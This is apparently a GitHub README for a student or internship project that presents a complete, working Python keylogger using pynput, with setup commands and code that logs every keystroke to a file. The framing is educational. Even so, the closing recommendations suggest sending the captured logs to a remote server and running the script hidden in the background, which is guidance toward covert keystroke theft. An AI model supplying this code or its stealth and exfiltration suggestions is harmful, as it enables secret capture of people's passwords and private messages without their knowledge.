# ProdigyInfoTech_keylogger
## 📖 Introduction
A keylogger is a tool that records keystrokes made by a user on a system. This project demonstrates a simple **Python-based keylogger** using the `pynput` library. The recorded keystrokes are stored in a log file (`keylog.txt`) for monitoring purposes.

### Use Cases:
- Ethical hacking & cybersecurity learning  
- Debugging & monitoring personal keystrokes  
- Educational purposes in security awareness
## Installation & Setup
###  Install Python & Virtual Environment
Ensure you have **Python 3.10+** installed.

# Create a virtual environment
python3 -m venv myenv

# Activate the virtual environment
source myenv/bin/activate  # On Linux/macOS
myenv\Scripts\activate  # On Windows

# Install required libraries
pip install pynput
![image](https://github.com/user-attachments/assets/985d21f4-6811-4a5f-a4d7-00eeb730399c)

## Create the Keylogger Script
Create a file named keylogger.py and add the following code:
from pynput.keyboard import Listener, Key
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

![image](https://github.com/user-attachments/assets/9ea83ec2-c5e7-4b6e-8e3d-a148e8dba70b)

## Run the script in the terminal:
python keylogger.py
The keylogger will start capturing keystrokes and saving them in keylog.txt.

## Result 
![image](https://github.com/user-attachments/assets/39e83ade-a846-4da1-8162-5ed55471102a)

## Recommendations
- Use this script ethically: Do not deploy it without explicit permission.
- Enhance security: Implement encryption for log files to prevent unauthorized access.
- Add remote logging: Send logs to a remote server for real-time monitoring.
- Use stealth mode (optional): Modify the script to run in the background.
